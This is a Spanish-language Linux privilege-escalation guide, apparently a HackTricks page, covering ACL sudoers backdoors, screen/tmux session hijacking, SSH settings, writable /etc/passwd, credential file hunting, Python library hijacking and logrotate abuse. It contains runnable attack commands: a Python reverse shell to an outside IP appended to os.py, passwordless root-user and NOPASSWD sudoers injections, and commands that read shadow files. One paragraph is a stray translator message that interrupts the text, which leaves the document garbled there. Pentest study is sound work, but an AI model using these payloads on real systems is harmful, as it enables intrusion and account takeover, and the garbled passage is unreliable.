Las capacidades de Linux proporcionan un **subconjunto de los privilegios root disponibles a un proceso**. Esto efectivamente divide los **privilegios de root en unidades más pequeñas y distintivas**. Cada una de estas unidades puede luego ser otorgada de forma independiente a procesos. De este modo se reduce el conjunto completo de privilegios, disminuyendo los riesgos de explotación.\
Lee la siguiente página para **aprender más sobre las capacidades y cómo abusar de ellas**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Permisos de directorio

En un directorio, el **bit de "execute"** implica que el usuario afectado puede "**cd**" al directorio.\
El bit **"read"** implica que el usuario puede **listar** los **archivos**, y el bit **"write"** implica que el usuario puede **eliminar** y **crear** nuevos **archivos**.

## ACLs

Access Control Lists (ACLs) representan la capa secundaria de permisos discrecionales, capaces de **anular los permisos tradicionales ugo/rwx**. Estos permisos mejoran el control de acceso a archivos o directorios al permitir o denegar derechos a usuarios específicos que no son los propietarios ni forman parte del grupo. Este nivel de **granularidad asegura una gestión de accesos más precisa**. Puede encontrar más detalles [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Dar** al usuario "kali" permisos de lectura y escritura sobre un archivo:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Obtener** archivos con ACLs específicas del sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Backdoor ACL oculto en sudoers drop-ins

Una configuración errónea común es un archivo propiedad de root en `/etc/sudoers.d/` con modo `440` que aún concede acceso de escritura a un low-priv user vía ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Si ves algo como `user:alice:rw-`, el usuario puede añadir una regla sudo a pesar de los bits de modo restrictivos:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Este es un vector de ACL persistence/privesc de alto impacto porque es fácil pasarlo por alto en revisiones únicamente con `ls -l`-only.

## Sesiones shell abiertas

En **versiones antiguas** puedes **hijack** alguna **shell** de otro usuario (**root**).\
En **versiones más recientes** solo podrás **connect** a screen sessions del **propio usuario**. Sin embargo, podrías encontrar **información interesante dentro de la sesión**.

### screen sessions hijacking

**Listar screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**Adjuntar a una sesión**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Esto fue un problema con **versiones antiguas de tmux**. No pude hijackear una sesión de tmux (v2.1) creada por root como un usuario sin privilegios.

**Listar sesiones de tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Adjuntar a una sesión**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Revisa **Valentine box from HTB** para un ejemplo.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
Este bug se produce al crear una nueva ssh key en esos OS, ya que **solo 32,768 variaciones eran posibles**. Esto significa que todas las posibilidades pueden ser calculadas y **teniendo la ssh public key puedes buscar la private key correspondiente**. You can find the calculated possibilities here: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Especifica si la autenticación por password está permitida. El valor por defecto es `no`.
- **PubkeyAuthentication:** Especifica si la autenticación por public key está permitida. El valor por defecto es `yes`.
- **PermitEmptyPasswords**: Cuando la autenticación por password está permitida, especifica si el servidor permite login a cuentas con cadenas de password vacías. El valor por defecto es `no`.

### Login control files

Estos ficheros influyen en quién puede hacer login y cómo:

- **`/etc/nologin`**: si está presente, bloquea los logins no-root y muestra su mensaje.
- **`/etc/securetty`**: restringe desde dónde root puede hacer login (TTY allowlist).
- **`/etc/motd`**: banner post-login (can leak environment or maintenance details).

### PermitRootLogin

Especifica si root puede hacer login usando ssh, por defecto es `no`. Valores posibles:

- `yes`: root puede hacer login usando password y private key
- `without-password` or `prohibit-password`: root solo puede hacer login con una private key
- `forced-commands-only`: root puede hacer login solo usando private key y si se especifican las opciones de commands
- `no` : no

### AuthorizedKeysFile

Especifica los ficheros que contienen las public keys que pueden usarse para la autenticación de usuarios. Puede contener tokens como `%h`, que serán reemplazados por el home directory. **You can indicate absolute paths** (starting in `/`) or **relative paths from the user's home**. For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Esa configuración indicará que si intentas iniciar sesión con la **private** key del usuario "**testusername**" ssh va a comparar la **public key** de tu key con las que están ubicadas en `/home/testusername/.ssh/authorized_keys` y `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding permite **use your local SSH keys instead of leaving keys** (without passphrases!) en tu servidor. Así, podrás **jump** vía ssh **to a host** y desde allí **jump to another** host **using** la **key** ubicada en tu **initial host**.

Debes establecer esta opción en `$HOME/.ssh.config` así:
```
Host example.com
ForwardAgent yes
```
Observa que si `Host` es `*`, cada vez que el usuario salte a otra máquina, esa máquina podrá acceder a las claves (lo cual es un problema de seguridad).

El archivo `/etc/ssh_config` puede **sobrescribir** estas **opciones** y permitir o denegar esta configuración.\
El archivo `/etc/sshd_config` puede **permitir** o **denegar** el reenvío de ssh-agent con la palabra clave `AllowAgentForwarding` (por defecto está permitido).

Si encuentras que Forward Agent está configurado en un entorno, lee la siguiente página ya que **podrías ser capaz de abusar de ello para escalar privilegios**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Archivos interesantes

### Archivos de perfil

El archivo `/etc/profile` y los archivos bajo `/etc/profile.d/` son **scripts que se ejecutan cuando un usuario inicia un nuevo shell**. Por lo tanto, si puedes **escribir o modificar cualquiera de ellos puedes escalar privilegios**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Si se encuentra algún script de perfil extraño, debes revisarlo en busca de **detalles sensibles**.

### Archivos passwd/shadow

Dependiendo del SO, los archivos `/etc/passwd` y `/etc/shadow` pueden usar un nombre distinto o puede existir una copia de seguridad. Por lo tanto, se recomienda **encontrarlos todos** y **comprobar si puedes leerlos** para ver **si hay hashes** dentro de los archivos:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
En algunas ocasiones puedes encontrar **password hashes** dentro del archivo `/etc/passwd` (o equivalente)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd escribible

Primero, genere una contraseña con uno de los siguientes comandos.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Necesito el contenido de src/linux-hardening/privilege-escalation/README.md para poder traducirlo al español. ¿Quieres que además genere ahora una contraseña para el usuario `hacker` (longitud por defecto 20)? Si confirmas, añadiré al final del archivo la instrucción para crear el usuario `hacker` y la contraseña generada (incluyendo los comandos a ejecutar).
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Ej.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Ahora puedes usar el comando `su` con `hacker:hacker`

Alternativamente, puedes usar las siguientes líneas para añadir un usuario dummy sin contraseña.\
ADVERTENCIA: podrías degradar la seguridad actual de la máquina.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTA: En plataformas BSD `/etc/passwd` se encuentra en `/etc/pwd.db` y `/etc/master.passwd`, además `/etc/shadow` se renombra a `/etc/spwd.db`.

Deberías comprobar si puedes **escribir en algunos archivos sensibles**. Por ejemplo, ¿puedes escribir en algún **archivo de configuración de servicio**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Por ejemplo, si la máquina está ejecutando un servidor **tomcat** y puedes **modificar el archivo de configuración del servicio Tomcat dentro de /etc/systemd/,** entonces puedes modificar las líneas:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Tu backdoor se ejecutará la próxima vez que se inicie tomcat.

### Comprobar carpetas

Los siguientes directorios pueden contener copias de seguridad o información interesante: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Probablemente no puedas leer el último, pero inténtalo)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Ubicación extraña/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Archivos modificados en los últimos minutos
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Archivos DB de Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml archivos
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Archivos ocultos
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Scripts/Binarios en PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Archivos web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Copias de seguridad**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Archivos conocidos que contienen contraseñas

Revisa el código de [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), busca **varios archivos posibles que podrían contener contraseñas**.\
**Otra herramienta interesante** que puedes usar para ello es: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) que es una aplicación de código abierto utilizada para recuperar muchas contraseñas almacenadas en un equipo local para Windows, Linux y Mac.

### Logs

Si puedes leer logs, podrías encontrar **información interesante/confidencial en su interior**. Cuanto más extraño sea el log, más interesante será (probablemente).\
Además, algunos "**bad**" configurados (backdoored?) **audit logs** pueden permitirte **registrar contraseñas** dentro de audit logs como se explica en este post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Para poder **leer logs, el grupo** [**adm**](interesting-groups-linux-pe/index.html#adm-group) será de gran ayuda.

### Archivos Shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

También deberías buscar archivos que contengan la palabra "**password**" en su **nombre** o dentro del **contenido**, y también buscar IPs y emails dentro de logs, o hashes regexps.\
No voy a listar aquí cómo hacer todo esto, pero si te interesa puedes revisar las últimas comprobaciones que [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) realiza.

## Archivos escribibles

### Python library hijacking

Si sabes desde **dónde** se va a ejecutar un script de python y **puedes escribir dentro** de esa carpeta o puedes **modificar python libraries**, puedes modificar la librería os y backdoor it (si puedes escribir donde se va a ejecutar el script de python, copia y pega la librería os.py).

Para **backdoor the library**, simplemente añade al final de la librería os.py la siguiente línea (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Explotación de logrotate

Una vulnerabilidad en `logrotate` permite a usuarios con **permisos de escritura** sobre un archivo de registro o sus directorios padre potencialmente obtener privilegios escalados. Esto se debe a que `logrotate`, que a menudo se ejecuta como **root**, puede ser manipulado para ejecutar archivos arbitrarios, especialmente en directorios como _**/etc/bash_completion.d/**_. Es importante verificar los permisos no solo en _/var/log_ sino también en cualquier directorio donde se aplique la rotación de logs.

> [!TIP]
> Esta vulnerabilidad afecta a `logrotate` versión `3.18.0` y anteriores

Más información detallada sobre la vulnerabilidad se puede encontrar en esta página: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Puedes explotar esta vulnerabilidad con [**logrotten**](https://github.com/whotwagner/logrotten).

Esta vulnerabilidad es muy similar a [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** así que cuando encuentres que puedes alterar logs, verifica quién está gestionando esos logs y comprueba si puedes escalar privilegios sustituyendo los logs por symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Referencia de la vulnerabilidad:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Si, por cualquier motivo, un usuario puede **escribir** un script `ifcf-<whatever>` en _/etc/sysconfig/network-scripts_ **o** puede **ajustar/modificar** uno existente, entonces tu **sistema está pwned**.

Network scripts, _ifcg-eth0_ por ejemplo, se usan para conexiones de red. Se parecen exactamente a archivos .INI. Sin embargo, son \~sourced\~ en Linux por Network Manager (dispatcher.d).

En mi caso, el atributo `NAME=` en estos network scripts no se maneja correctamente. Si tienes **espacios en blanco en el nombre el sistema intenta ejecutar la parte después del espacio en blanco**. Esto significa que **todo lo que esté después del primer espacio en blanco se ejecuta como root**.

Por ejemplo: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Nota el espacio en blanco entre Network y /bin/id_)

### **init, init.d, systemd y rc.d**

El directorio `/etc/init.d` alberga **scripts** para System V init (SysVinit), el **sistema clásico de gestión de servicios de Linux**. Incluye scripts para `start`, `stop`, `restart`, y a veces `reload` de servicios. Estos se pueden ejecutar directamente o a través de enlaces simbólicos encontrados en `/etc/rc?.d/`. Una ruta alternativa en sistemas Redhat es `/etc/rc.d/init.d`.

Por otro lado, `/etc/init` está asociado con **Upstart**, un más reciente **service management** introducido por Ubuntu, que usa ficheros de configuración para tareas de gestión de servicios. A pesar de la transición a Upstart, los scripts SysVinit siguen utilizándose junto a las configuraciones de Upstart debido a una capa de compatibilidad en Upstart.

**systemd** surge como un inicializador y gestor de servicios moderno, ofreciendo características avanzadas como arranque de demonios on-demand, gestión de automounts y snapshots del estado del sistema. Organiza archivos en `/usr/lib/systemd/` para paquetes de distribución y `/etc/systemd/system/` para modificaciones del administrador, agilizando la administración del sistema.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks commonly hook a syscall to expose privileged kernel functionality to a userspace manager. Weak manager authentication (e.g., signature checks based on FD-order or poor password schemes) can enable a local app to impersonate the manager and escalate to root on already-rooted devices. Learn more and exploitation details here:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery in VMware Tools/Aria Operations can extract a binary path from process command lines and execute it with -v under a privileged context. Permissive patterns (e.g., using \S) may match attacker-staged listeners in writable locations (e.g., /tmp/httpd), leading to execution as root (CWE-426 Untrusted Search Path).

Learn more and see a generalized pattern applicable to other discovery/monitoring stacks here:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Protecciones de seguridad del kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Más ayuda

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Mejor herramienta para buscar Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumera vulnerabilidades del kernel en Linux y MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilación de más scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
